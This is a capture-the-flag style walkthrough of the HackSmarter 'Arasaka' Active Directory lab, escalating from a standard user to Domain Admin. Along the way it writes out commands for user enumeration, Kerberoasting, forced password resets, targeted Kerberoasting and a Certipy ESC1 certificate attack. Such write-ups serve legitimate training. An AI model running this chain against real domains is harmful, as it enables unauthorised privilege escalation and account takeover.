---
title: "HackSmarter Arasaka Walkthrough  "
date: 2026-05-29 00:00:00 +0000
categories: [ HackSmarter]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fea06620-a267-415b-a27a-0840c0e4d1e6" />


## Scenario : 

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.
The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

## Solution : 

First thing first , we start by adding the hostname as well as the Domain name to our /etc/hosts file . 

<img width="1587" height="398" alt="image" src="https://github.com/user-attachments/assets/ba94ebd8-49da-4a20-a229-11c7ebdc4612" />

Then we run our nmap scan :

<img width="1039" height="653" alt="image" src="https://github.com/user-attachments/assets/bba78253-8efe-432b-b872-e14513c07183" />

We see Kerberos , LDAP , DNS as well which confirms this is the DC . since this is an AD machine i like to follow this quick checklist from my methodology : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

We're already given a set of credentials to start with : -u 'faraday' -p 'hacksmarter123' .  Let's first generate a list of usernames , test for Both ASREPROASTING as well as Kerberoasting . 

```bash
nxc smb $target -u 'faraday' -p 'hacksmarter123' --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee users.txt 
```
<img width="1793" height="589" alt="image" src="https://github.com/user-attachments/assets/d286b88a-e2aa-4e42-bac2-b0342ec357a7" />

 No users were vulnerable to ASREPROASTING , let's check for kerberoastable users : 

 <img width="1483" height="322" alt="image" src="https://github.com/user-attachments/assets/9d0f0c98-b8a1-48cf-94bb-b0b36068892b" />

Perfect , we found one now let's try and crack the  Hash : 

<img width="1279" height="457" alt="image" src="https://github.com/user-attachments/assets/62d9181c-35e0-4107-8f1e-4d7077eea674" />

We see that for now our user doesn't have Admin rights on the machine via smb , checking the Shares we only find default ones (if we don't find anything at all we might go back to enumerate them ) , checked for winrm access but this user doesn't have such permissions . 

<img width="1607" height="522" alt="image" src="https://github.com/user-attachments/assets/5d8e4080-3347-4680-98e0-8f26d0807c87" />

This is where i decided to run Bloodhound , just to get a better view of how the domain is structured , what ACL exist and if our user has any interesting permissions over other users or groups that we can abuse , here are the commands to setup Bloodhound , for the ingestor i used netexec . 

<img width="1836" height="358" alt="image" src="https://github.com/user-attachments/assets/2b3c9878-ba79-407c-b11c-0c31789875cf" />

Now if we check the Outbound Object control , we find that our user has Generic All over the user Yorinobu , Looking at Bloodhound we see that we can abuse this by Forcing the change of that user's passsword , for this i will use net rpc . 

<img width="1415" height="540" alt="image" src="https://github.com/user-attachments/assets/04b85926-6ea5-417e-a9c4-a392785bda76" />

```bash
net rpc password "YORINOBU" "weak123@" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "DC01.hacksmarter.local"
```
<img width="1571" height="286" alt="image" src="https://github.com/user-attachments/assets/1fd2ab77-5b0b-4215-b053-a7c8d1d2f943" />

Perfect , Yorinobu has WinRM access to the machine but before logging in, let's first check BloodHound to see what ACLs our user has and identify any interesting attack paths.

<img width="1472" height="534" alt="image" src="https://github.com/user-attachments/assets/f4f9b4a4-97f8-439a-83f7-38aaf71f099a" />

We do have Generic Write over the user Soulkiller.SVC , we can abuse this by setting up an SPN for this user , and attempting a kerberoast attack on that user , this is what's called a Targeted Kerberoast attack , for this we will use a specific tool , here are links and commands : 

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git 
cd targetedKerberoast.git
python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'YORINOBU' -p 'weak123@'
```

<img width="1699" height="789" alt="image" src="https://github.com/user-attachments/assets/82783b3c-e449-4695-a142-4cefe61688c9" />

Now let's try to crack it using John : 

<img width="1265" height="317" alt="image" src="https://github.com/user-attachments/assets/69c3d14d-e54a-4104-b019-8de3ae3429cb" />

Perfect , now from Bloodhound we can see that this user is part of the CA group , this is always worth investigating since CA group members often have elevated privileges over certificate templates, making it a good reason to run Certipy and check for ESC vulnerabilities.

<img width="1542" height="529" alt="image" src="https://github.com/user-attachments/assets/d60d5174-14fa-4463-b4ca-9c15cb8abba3" />

Now we just run certipy with the new creds found . 

<img width="1200" height="662" alt="image" src="https://github.com/user-attachments/assets/97e05010-647b-4dbe-aad9-5c491b212aa0" />

Luckily for us , we have an ESC1 . 

<img width="1373" height="416" alt="image" src="https://github.com/user-attachments/assets/2218e0db-5304-4730-aefa-2856037c2040" />

Now there are many resources that serve as guides to exploit the ESC vulnerabilities but for this one i will use the Certipy Wiki . 

```bash
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
```
To briefly explain ESC1 — this vulnerability occurs when a certificate template allows the requester to specify an arbitrary Subject Alternative Name (SAN), meaning we can request a certificate on behalf of any user, including a Domain Admin, without knowing their credentials. We abuse this by requesting a certificate impersonating the Administrator, then using that certificate to request a TGT via PKINIT, which gives us the NT hash.

Steps to abuse ESC1 

```bash
==> We frist need the SID of the  Administrator :
certipy-ad  account -u 'Soulkiller.svc' -p 'MYpassword123#' -dc-ip $target -user 'administrator' read

==> Now we request the Cetificate :
certipy-ad req \ 
    -u 'Soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' \
    -dc-ip $target -target 'DC01.hacksmarter.local' \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' \
    -upn 'administrator@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'

==> Finally we request the TGT :
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target 
```
<img width="1312" height="448" alt="image" src="https://github.com/user-attachments/assets/40097c3b-3537-44c7-9af5-d0dd22cb0093" />

Now in my case i was able to generate the certificate , but when i request a TGT , since the Administrator password is expired ,  we can't request a TGT for him . 

<img width="1639" height="490" alt="image" src="https://github.com/user-attachments/assets/cb302391-f3bd-4bea-9a4c-df966c275592" />

To work around this, we can request an LDAP shell using the Administrator certificate. Since the certificate is enough to authenticate over LDAP, this gives us an interactive shell where we can reset the Administrator password to anything we want, bypassing the expiry issue entirely.

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target -ldap-shell

==> Once inside the Shell :
change_password administrator NewPassword123!
```

<img width="1590" height="717" alt="image" src="https://github.com/user-attachments/assets/0333aeb9-a928-4628-b28f-29acaa4fb31f" />

Perfect , just like that we are able to change the Domain Admin password , now just login via evil-winrm and get the Flag . 

<img width="711" height="783" alt="image" src="https://github.com/user-attachments/assets/e73e3551-a69b-4463-91f0-3c7764ed27c7" />

That was all for this Lab , see you in the next one :)

